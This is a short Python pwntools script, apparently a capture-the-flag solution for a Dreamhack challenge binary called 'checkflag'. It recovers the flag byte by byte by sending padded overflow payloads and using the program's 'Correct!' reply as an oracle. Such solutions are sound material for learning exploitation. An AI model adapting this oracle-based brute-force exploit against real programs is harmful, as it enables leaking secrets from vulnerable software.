#!/usr/bin/env python3

from pwn import *

exe = ELF("./checkflag")

context.binary = exe
context.log_level = "error"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 20169)

    return r


def main():

    leak = b"\x00"

    for i in range(63):
        pad = b"A" * (62 - i)
        for c in [0] + list(range(32, 127)):
            r = conn()
            payload = pad + p8(c) + leak + pad

            r.sendafter(b"What's the flag? ", payload)
            result = r.recvline()
            r.close()

            if b"Correct!" in result:
                leak = p8(c) + leak
                break
    
    print(f"flag: {leak.strip(b"\x00").decode()}")


if __name__ == "__main__":
    main()